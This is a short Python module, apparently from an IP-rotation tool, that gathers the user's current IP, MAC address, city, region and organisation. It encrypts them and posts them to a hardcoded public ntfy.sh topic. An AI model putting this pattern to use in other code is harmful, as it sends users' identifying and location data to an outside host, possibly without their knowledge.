import requests
from utils import get_real_info
from encryptor import encrypt_data

NTFY_URL = "https://ntfy.sh/iprotatorlogs"

def send_webhook_notification(current_ip):
    user_info = get_real_info()
    message = f"IP: {current_ip}\nMAC: {user_info['mac']}\nLoc: {user_info.get('city', '-')}, {user_info.get('region', '-')}\nORG: {user_info.get('org')}"
    encrypted = encrypt_data(message)
    try:
        requests.post(NTFY_URL, data=encrypted.encode())
    except Exception as e:
        print(f"[!] Gagal kirim notifikasi: {e}")
